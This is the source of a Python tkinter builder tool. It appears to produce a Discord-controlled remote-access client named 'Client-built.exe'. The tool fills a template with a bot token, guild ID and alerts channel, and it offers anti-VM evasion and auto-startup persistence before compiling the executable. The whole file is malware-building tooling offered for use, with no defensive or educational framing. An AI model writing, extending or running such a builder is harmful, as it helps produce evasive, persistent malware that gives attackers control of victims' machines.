import tkinter as tk, os, shutil, subprocess

import builderassets.compile as compiler
import builderassets.requirements as requirements

from time import sleep
from tkinter import ttk
from PIL import Image, ImageTk

buildstarted = False

def build_bot(anti_vm_variable, autostartup_variable):
    global buildstarted
    if buildstarted != True:

        if os.path.exists("builderassets\\__pycache__"):
            shutil.rmtree("builderassets\\__pycache__")

        bot_token = textbox1.get()
        guild_id = textbox2.get()
        alerts_id = textbox3.get()

        if bot_token and guild_id and alerts_id != "":
            pass
        else:
            return

        buildstarted = True
        build_button.config(text="BUILDING")

        if str(anti_vm_variable) == "PY_VAR0":
            anti_vm_variable = False
        elif str(anti_vm_variable) == "PY_VAR1":
            anti_vm_variable = True
        
        if str(autostartup_variable) == "PY_VAR0":
            autostartup_variable = False
        elif str(autostartup_variable) == "PY_VAR1":
            autostartup_variable = True

        if os.path.exists(".buildmodules\\main.py"):
            os.remove(".buildmodules\\main.py")
        
#token = "{token}"
#guild_id = "{guild_id}"
#autostart = "{autostart}"
#antivm = "{antivm}"
#annc_channel_id = "{announcements}"

        newfile = shutil.copy(".buildmodules\\sample.py", ".buildmodules\\main.py")
        with open(newfile, "r") as f:
            content = f.read()

        newcontent = content.replace("{token}", bot_token)
        newcontent = newcontent.replace("{guild_id}", guild_id)
        newcontent = newcontent.replace("{announcements}", alerts_id)
        newcontent = newcontent.replace('"{antivm}"', str(anti_vm_variable))
        newcontent = newcontent.replace('"{autostart}"', str(autostartup_variable))

        with open(newfile, "w+") as f:
            f.write(newcontent)

        sleep(1)

        compiler.compile()

        if os.path.exists("build"):
            shutil.rmtree("build")
        if os.path.exists("dist"):
            shutil.copy("dist\\Client-built.exe", "Client-built.exe")
            shutil.rmtree("dist")
        if os.path.exists("Client-built.spec"):
            os.remove("Client-built.spec")
        if os.path.exists("builderassets\\__pycache__"):
            shutil.rmtree("builderassets\\__pycache__")

        build_button.config(text="BUILD")
    else:
        buildstarted = False
        if os.path.exists("build"):
            shutil.rmtree("build")
        if os.path.exists("dist"):
            shutil.rmtree("dist")
        if os.path.exists("Client-built.spec"):
            os.remove("Client-built.spec")
        build_button.configure(text="BUILD")
        if os.path.exists("builderassets\\__pycache__"):
            shutil.rmtree("builderassets\\__pycache__")

def installreq():
    installreq_button.config(text="INSTALLING REQUIREMENTS")
    requirements.install()
    installreq_button.config(text="INSTALL REQUIREMENTS")

root = tk.Tk()
root.title("Aphrobyte @ RIOT Administration")
root.geometry("400x470")
root.configure(background="#333")

root.update_idletasks()
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
x = (screen_width - root.winfo_width()) // 2
y = (screen_height - root.winfo_height()) // 2
root.geometry(f"+{x}+{y}")

style = ttk.Style()
style.configure("TFrame", background="#333")
style.configure("TLabel", background="#333", foreground="white")
style.configure("TButton", background="#333", foreground="black", padding=(10, 5))
style.configure("TCheckbutton", background="#333", foreground="white")

logo_image = Image.open("builderassets\\logo.png")
logo_image = logo_image.resize((100, 100))
logo_photo = ImageTk.PhotoImage(logo_image)
logo_label = tk.Label(root, image=logo_photo, bg="#333")
logo_label.image = logo_photo
logo_label.pack(pady=20)

input_frame = ttk.Frame(root, style="TFrame")
input_frame.pack(pady=10)

# bot token
label1 = ttk.Label(input_frame, text="Bot Token:")
label1.grid(row=0, column=0, padx=10, sticky="e")
textbox1 = tk.Entry(input_frame, bg="white")
textbox1.grid(row=0, column=1, padx=10, pady=10, sticky="w")

# guild id
label2 = ttk.Label(input_frame, text="Guild ID:")
label2.grid(row=1, column=0, padx=10, sticky="e")
textbox2 = tk.Entry(input_frame, bg="white")
textbox2.grid(row=1, column=1, padx=10, pady=10, sticky="w")

# alerts channel
label3 = ttk.Label(input_frame, text="Alerts channel ID:")
label3.grid(row=2, column=0, padx=10, sticky="e")
textbox3 = tk.Entry(input_frame, bg="white")
textbox3.grid(row=2, column=1, padx=10, pady=10, sticky="w")

checkbox_frame = ttk.Frame(root, style="TFrame")
checkbox_frame.pack(pady=10)

# anti vm checkbox
anti_vm_variable = tk.BooleanVar()
anti_vm = ttk.Checkbutton(checkbox_frame, text="Anti VM", variable=anti_vm_variable)
anti_vm.pack(side="left", padx=10)

# auto startup checkbox
autostartup_variable = tk.BooleanVar()
auto_startup = ttk.Checkbutton(checkbox_frame, text="Auto Startup", variable=autostartup_variable)
auto_startup.pack(side="left", padx=10)

# build button
build_button = ttk.Button(root, text="BUILD", command=lambda: build_bot(anti_vm_variable, autostartup_variable))
build_button.pack(pady=20)

# install requirements button
installreq_button = ttk.Button(root, text="INSTALL REQUIREMENTS", command=installreq)
installreq_button.pack(pady=21)

root.iconbitmap("builderassets\\bitmap.ico")
root.mainloop()